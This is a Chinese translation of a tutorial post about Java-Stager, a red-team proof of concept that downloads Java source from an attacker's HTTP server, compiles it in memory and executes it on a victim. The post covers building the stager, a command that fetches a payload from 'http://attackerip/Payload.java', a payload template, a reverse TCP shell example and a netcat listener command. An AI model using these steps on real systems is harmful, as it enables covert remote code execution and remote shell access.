# Java-Stager:在内存中下载、编译和执行 Java 文件的 PoC

> 原文：<https://kalilinuxtutorials.com/java-stager-download-compile-execute/>

PoC **Java-Stager** 可以下载、编译和执行内存中的 Java 文件。

对我来说，这次演讲的关键部分是:

*   将 Stager 加载到受害者上(接触磁盘，但为良性二进制文件)
*   Stager 通过 HTTP 下载原始代码(保存在内存中)
*   Stager 编译原始代码(也在内存中)
*   Stager 然后执行编译后的代码(也在内存中)

 **## **如何使用 Java-Stager**

*   克隆整个存储库。
*   在可以使用 maven 的 IDE 中打开它(比如 NetBeans)
*   Stager 和示例负载位于“/src/main/java”文件夹中。
*   根据需要更改 Stager 并编译项目。我在默认配置文件中使用了“清理/构建”。

NetBeans 中的输出包括这样一行:

`**Building jar: C:\Users\cornerpirate\Documents\NetBeansProjects\java-stager\target\JavaStager-0.1-initial.jar**`

要对受害者进行治疗，您必须上传“JavaStager*。jar”文件和包含来自“目标”文件夹的 Janino 的“lib”文件夹。

以下命令将执行登台程序:

`**java -jar JavaStager-0.1-initial.jar**`

将提示您使用，如下所示:

`**Proper Usage is: java -jar JavaStager-0.1-initial.jar <url>**`

“url”是传递给 Stager 的唯一参数。一个使用示例是:

**`java -jar JavaStager-0.1-initial.jar http://attackerip/Payload.java`**

您的有效负载必须位于名为“Payload.java”的文件中，而您的漏洞代码必须位于名为“Run”的静态方法中。如果您想编写自己的代码，下面显示了模板:

```
public class Payload {
   public static void Run() {
      // Your code here
   }
}
```

我在“TCPReverseShell.java”文件中提供了一个反向 TCP 有效负载的例子。为了防止名称冲突，这个不叫“Payload.java ”,类名是错误的。“TCPReverseShell.java”中的头注释解释了如何修改它才能工作。

您需要在 HTTP 服务器上托管您的“Payload.java”文件。攻击者需要使用标准的`**nc -lvp 8044**`技术启动一个 netcat 监听器来捕捉连接。

[![](img/d861a9096555aeb1980fc054015933d7.png) ](https://github.com/cornerpirate/java-stager) **信用:詹姆斯·威廉姆斯****